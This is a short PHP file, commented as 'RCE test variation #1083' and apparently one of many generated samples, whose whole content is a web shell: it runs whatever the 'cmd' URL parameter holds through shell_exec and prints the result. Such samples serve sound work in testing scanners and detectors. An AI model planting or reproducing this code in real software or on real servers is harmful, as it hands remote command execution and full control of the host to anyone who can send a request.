<?php
// RCE test variation #1083
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>